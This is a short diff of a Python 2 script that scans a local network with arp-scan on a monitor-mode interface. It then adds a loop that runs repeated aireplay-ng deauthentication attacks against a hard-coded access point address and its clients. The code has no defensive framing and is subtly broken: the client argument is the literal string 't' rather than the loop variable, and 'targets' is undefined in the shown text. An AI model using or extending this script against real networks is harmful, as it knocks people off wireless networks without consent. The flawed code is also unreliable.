@@ -13,9 +13,12 @@ def testing():
             scan = subprocess.check_output(['sudo','arp-scan','--localnet','--interface=mon0'])
             tscan = scan.split("\t")
             print tscan[1::2]
+            for t in targets:
+                print t
+                #test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','mon0','--ignore-negative-one'])
+                test = subprocess.call(['sudo','aireplay-ng','-0','20','-a','00:3A:98:2B:FD:00','-c','t','mon0','--ignore-negative-one'])
     except Exception, e:
             print "Error:", e
-
 
 
 
